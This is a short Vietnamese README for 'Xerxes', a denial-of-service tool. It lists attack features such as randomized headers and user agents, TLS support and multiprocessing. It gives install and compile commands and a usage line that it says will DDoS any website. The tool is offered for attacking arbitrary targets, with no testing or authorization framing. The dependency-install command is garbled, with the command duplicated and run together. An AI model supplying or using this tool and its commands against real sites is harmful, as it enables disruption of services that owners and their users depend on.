# XERXES
XERXES là công cụ DoS đơn giản mạnh mẽ nhất của zanyarjamal

# Công cụ dos Xerxes được cải tiến với nhiều tính năng như:
- [x] Hỗ trợ TLS
- [x] Tự random HTTP header
- [x] Tự random Useragent
- [x] Hỗ trợ đa xử lý
- [x] Nhiều phương thức tấn công
v.v …

# Cách cài đặt
Cài đặt các thư viện cần thiết cho Xerxes
```
sudo apt-get -y install build-essential cmake libssl-dev pkgconfsudo apt-get -y install build-essential cmake libssl-dev pkgconf
```
Tải xerxes về máy tính
```
git clone https://github.com/DauDau432/xerxes.git
```
Sau đó di chuyển đến thư mục vừa cài đặt
```
cd xerxes
```
Tiếp theo, bạn nên biên dịch với trình biên dịch GNU GCC
```
gcc xerxes.c -o xerxes
```
# Cách sử dụng
Sử dụng lệnh dưới đây để DDOS vào Website bất kỳ
```
./xerxes <IP/URL> 80
```
